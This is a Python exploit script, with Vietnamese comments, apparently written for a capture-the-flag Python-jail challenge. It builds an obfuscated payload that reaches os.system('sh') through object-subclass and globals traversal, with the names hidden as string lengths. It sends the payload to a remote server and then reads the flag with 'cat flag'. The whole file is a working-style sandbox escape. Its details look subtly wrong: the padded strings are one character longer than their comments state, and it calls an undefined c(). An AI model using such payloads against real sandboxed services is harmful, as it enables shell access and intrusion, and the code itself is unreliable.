import socket

def generate_payload():
    # Tạo các chuỗi có độ dài tương ứng với mã ASCII cần thiết
    s95 = ' ' + 'C' * 95  # 95 ký tự
    s99 = ' ' + 'C' * 99  # 99 ký tự
    s108 = ' ' + 'C' * 108  # 108 ký tự
    s97 = ' ' + 'C' * 97  # 97 ký tự
    s115 = ' ' + 'C' * 115  # 115 ký tự
    s147 = ' ' + 'C' * 147  # 147 ký tự
    
    # Tạo payload sử dụng độ dài chuỗi thay vì số
    payload = f"""
    c(c(c(c(c(c(
        '', 
        ' %c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s99!r}), len({s108!r}), len({s97!r}), len({s115!r}), len({s115!r}), len({s95!r}))
    ), 
        ' %c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s108!r}), len({s97!r}), len({s115!r}), len({s97!r}), len({s115!r}), len({s95!r}))
    ), 
        ' %c%c%c%c%c%c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s115!r}), len({s115!r}), len({s97!r}), len({s99!r}), len({s108!r}), len({s97!r}), len({s115!r}), len({s115!r}), len({s97!r}), len({s115!r}), len({s95!r}))
    )()[len({s147!r})], 
        ' %c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s105!r}), len({s110!r}), len({s105!r}), len({s116!r}), len({s95!r}), len({s95!r}))
    ), 
        ' %c%c%c%c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s103!r}), len({s108!r}), len({s111!r}), len({s98!r}), len({s97!r}), len({s108!r}), len({s115!r}), len({s95!r}), len({s95!r}))
    )[
        ' %c%c' % (len({s111!r}), len({s115!r}))
    ], 
        ' %c%c%c%c%c%c' % (len({s115!r}), len({s121!r}), len({s115!r}), len({s116!r}), len({s101!r}), len({s109!r}))
    )(
        ' %c%c' % (len({s115!r}), len({s104!r}))
    )
    """.strip().replace('\n', '').replace('    ', '')
    
    return payload

# Các hằng số bổ sung (mã ASCII)
s105 = ' ' + 'C' * 105
s110 = ' ' + 'C' * 110
s116 = ' ' + 'C' * 116
s103 = ' ' + 'C' * 103
s111 = ' ' + 'C' * 111
s98 = ' ' + 'C' * 98
s121 = ' ' + 'C' * 121
s101 = ' ' + 'C' * 101
s109 = ' ' + 'C' * 109
s104 = ' ' + 'C' * 104

# Tạo payload
payload = generate_payload()

# Kết nối và gửi payload
HOST = 'play.scriptsorcerers.xyz'  # Thay bằng địa chỉ server thật
PORT = 5000         # Thay bằng port server thật

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        
        # Nhận thông điệp chào mừng
        welcome_msg = s.recv(1024).decode()
        print("Server:", welcome_msg)
        
        # Gửi payload
        print("Sending payload...")
        s.sendall(payload.encode() + b'\n')
        
        # Gửi lệnh đọc flag
        s.sendall(b'cat flag\n')
        
        # Nhận và in kết quả
        response = s.recv(4096).decode()
        print("Response:", response)
        
except Exception as e:
    print("Error:", e)